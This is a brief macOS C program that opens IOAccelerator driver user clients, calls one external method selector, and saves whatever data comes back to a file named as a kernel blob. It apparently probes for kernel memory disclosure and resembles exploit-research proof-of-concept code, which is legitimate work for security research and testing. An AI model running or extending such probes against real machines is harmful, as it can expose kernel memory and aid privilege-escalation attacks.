#include <IOKit/IOKitLib.h>
#include <stdio.h>
#include <string.h>
int main(void){
    io_iterator_t it; IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching("IOAccelerator"), &it);
    io_service_t svc; while((svc=IOIteratorNext(it))){
        for(uint32_t type=0;type<8;type++){
            io_connect_t conn=0; kern_return_t r=IOServiceOpen(svc,mach_task_self(),type,&conn);
            if(r!=KERN_SUCCESS) continue;
            unsigned char out[0x204]; size_t outCnt=sizeof(out); memset(out,0,sizeof(out));
            uint64_t output[8]; uint32_t outputCnt=8;
            kern_return_t cr=IOConnectCallMethod(conn,0x100,NULL,0,NULL,0,output,&outputCnt,out,&outCnt);
            printf("type=%u open ok call=0x%x outCnt=0x%zx\n",type,cr,outCnt);
            if(cr==KERN_SUCCESS){FILE*f=fopen("/tmp/ubm_kernel_blob.bin","wb");fwrite(out,1,outCnt,f);fclose(f);return 0;}
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    }
    return 1;
}
